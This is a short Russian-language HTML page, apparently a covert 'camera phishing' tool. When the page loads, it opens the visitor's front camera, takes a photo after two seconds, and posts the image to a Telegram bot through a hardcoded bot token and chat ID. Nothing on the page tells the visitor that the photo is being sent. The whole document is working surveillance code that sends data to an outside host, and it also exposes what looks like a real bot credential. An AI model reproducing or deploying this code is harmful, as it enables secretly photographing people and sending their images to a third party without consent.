<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
</head>
<body>
    <h2>Захваченное изображение:</h2>
    <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <img id="photo" alt="Фото будет здесь" style="max-width: 100%; display: none;">

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const photoElement = document.getElementById('photo');

        const BOT_TOKEN = "8186769001:AAHQ-3PT9NHqPbZTXvCinuMAhKpQJX2QQ68"; // Замени на новый токен
        const CHAT_ID = "7717007781"; // Твой chat_id

        // Запрашиваем доступ к камере
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // "user" — фронтальная камера
            .then(stream => {
                video.srcObject = stream;
                return new Promise(resolve => setTimeout(resolve, 2000)); // Даем камере загрузиться
            })
            .then(() => {
                capturePhoto(); // Делаем фото после загрузки
            })
            .catch(error => console.error("Ошибка доступа к камере:", error));

        function capturePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            video.srcObject.getTracks().forEach(track => track.stop()); // Останавливаем камеру

            canvas.toBlob(blob => {
                displayPhoto(blob);
                sendPhoto(blob);
            }, 'image/jpeg');
        }

        function displayPhoto(blob) {
            const url = URL.createObjectURL(blob);
            photoElement.src = url;
            photoElement.style.display = 'block';
            video.style.display = 'none'; // Скрываем видео после снимка
        }

        function sendPhoto(blob) {
            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log("Отправлено:", data))
            .catch(error => console.error("Ошибка отправки:", error));
        }
    </script>
</body>
</html>
